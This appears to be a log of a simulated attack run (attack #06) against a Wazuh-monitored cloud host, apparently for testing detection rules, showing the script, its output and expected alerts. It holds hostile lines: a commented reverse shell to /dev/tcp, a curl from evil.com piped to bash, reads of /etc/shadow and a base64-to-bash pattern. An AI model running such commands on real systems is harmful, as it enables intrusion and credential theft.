@@ -1,0 +1,184 @@
+===============================================================================
+[1;33mATTACK #06: Suspicious Script Execution[0m
+===============================================================================
+Target: ec2-54-204-182-4.compute-1.amazonaws.com
+Category: Malware
+
+[0;32m[*] Attack started at: 2026-01-05T18:52:42+03:00[0m
+
+[*] Commands to run on target agent:
+
+
+#!/bin/bash
+echo "[*] Suspicious script execution attack..."
+
+# 1. Create and execute script from /tmp (suspicious location)
+echo "[*] Creating suspicious scripts in /tmp..."
+
+# Reverse shell script (will not actually connect)
+cat > /tmp/reverse_shell.sh << "SCRIPT"
+#!/bin/bash
+# Simulated reverse shell - does not actually connect
+echo "Attempting connection to attacker..."
+# bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+sleep 1
+echo "Connection simulation complete"
+SCRIPT
+chmod +x /tmp/reverse_shell.sh
+
+# Data exfiltration script
+cat > /tmp/exfil.sh << "SCRIPT"
+#!/bin/bash
+# Simulated data exfiltration
+echo "Collecting sensitive data..."
+cat /etc/passwd > /tmp/stolen_data.txt 2>/dev/null
+cat /etc/shadow >> /tmp/stolen_data.txt 2>/dev/null
+echo "Data collection complete"
+SCRIPT
+chmod +x /tmp/exfil.sh
+
+# Cryptominer simulation
+cat > /tmp/miner.sh << "SCRIPT"
+#!/bin/bash
+# Simulated cryptominer
+echo "Starting mining simulation..."
+for i in {1..5}; do
+    echo "Mining block $i..."
+    sleep 1
+done
+echo "Mining simulation complete"
+SCRIPT
+chmod +x /tmp/miner.sh
+
+# Keylogger simulation
+cat > /tmp/keylogger.py << "SCRIPT"
+#!/usr/bin/env python3
+# Simulated keylogger - does not actually log keys
+print("Keylogger simulation started")
+import time
+time.sleep(2)
+print("Keylogger simulation ended")
+SCRIPT
+chmod +x /tmp/keylogger.py
+
+# 2. Execute suspicious scripts
+echo ""
+echo "[*] Executing suspicious scripts..."
+
+echo "  Running reverse_shell.sh..."
+/tmp/reverse_shell.sh 2>/dev/null
+
+echo "  Running exfil.sh..."
+/tmp/exfil.sh 2>/dev/null
+
+echo "  Running miner.sh..."
+/tmp/miner.sh 2>/dev/null
+
+if command -v python3 &> /dev/null; then
+    echo "  Running keylogger.py..."
+    python3 /tmp/keylogger.py 2>/dev/null
+fi
+
+# 3. Execute base64 encoded commands (common evasion technique)
+echo ""
+echo "[*] Executing base64 encoded commands..."
+# Encoded: echo "suspicious command executed"
+echo "ZWNobyAic3VzcGljaW91cyBjb21tYW5kIGV4ZWN1dGVkIgo=" | base64 -d | bash
+
+# 4. Download and execute pattern
+echo ""
+echo "[*] Simulating download and execute pattern..."
+# curl http://evil.com/malware.sh | bash  # Commented for safety
+echo "curl http://evil.com/malware.sh | bash" > /tmp/download_exec.log
+
+# 5. Execute script with suspicious arguments
+echo ""
+echo "[*] Running commands with suspicious patterns..."
+bash -c "whoami && id && uname -a"
+bash -c "cat /etc/passwd | head -5"
+
+# 6. Create persistence mechanism simulation
+echo ""
+echo "[*] Simulating persistence mechanism..."
+cat > /tmp/persistence.sh << "SCRIPT"
+#!/bin/bash
+# Simulated persistence - adds to bashrc (will be removed)
+echo "echo persistence_check" >> ~/.bashrc_backup_test
+SCRIPT
+chmod +x /tmp/persistence.sh
+/tmp/persistence.sh 2>/dev/null
+
+echo ""
+echo "[*] Waiting for detection..."
+sleep 10
+
+# Cleanup
+echo "[*] Cleaning up..."
+rm -f /tmp/reverse_shell.sh /tmp/exfil.sh /tmp/miner.sh /tmp/keylogger.py
+rm -f /tmp/stolen_data.txt /tmp/download_exec.log /tmp/persistence.sh
+rm -f ~/.bashrc_backup_test 2>/dev/null
+
+echo "[*] Cleanup complete"
+
+[*] Running attack via SSH using key /home/mohamad/.ssh/wazuh-agnet.pem ...
+[*] Suspicious script execution attack...
+[*] Creating suspicious scripts in /tmp...
+
+[*] Executing suspicious scripts...
+  Running reverse_shell.sh...
+Attempting connection to attacker...
+Connection simulation complete
+  Running exfil.sh...
+Collecting sensitive data...
+Data collection complete
+  Running miner.sh...
+Starting mining simulation...
+Mining block 1...
+Mining block 2...
+Mining block 3...
+Mining block 4...
+Mining block 5...
+Mining simulation complete
+  Running keylogger.py...
+Keylogger simulation started
+Keylogger simulation ended
+
+[*] Executing base64 encoded commands...
+suspicious command executed
+
+[*] Simulating download and execute pattern...
+
+[*] Running commands with suspicious patterns...
+ubuntu
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),119(netdev),120(lxd)
+Linux ip-172-31-28-229 6.8.0-1044-aws #46~22.04.1-Ubuntu SMP Tue Dec  2 12:52:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+[*] Simulating persistence mechanism...
+
+[*] Waiting for detection...
+[*] Cleaning up...
+[*] Cleanup complete
+
+===============================================================================
+[0;32m[✓] Attack script generated[0m
+===============================================================================
+Start Time: 2026-01-05T18:52:42+03:00
+End Time: 2026-01-05T18:53:00+03:00
+
+Expected Wazuh alerts:
+  - Rule 5902: Suspicious script execution
+  - Rule 5903: Script execution from /tmp
+  - Rule 80790: Base64 command execution
+  - Audit rules for command execution
+
+Data for CSV:
+  attack_id: 06
+  attack_name: Suspicious Script Execution
+  category: Malware
+  attack_start_time: 2026-01-05T18:52:42+03:00
+  attack_end_time: 2026-01-05T18:53:00+03:00
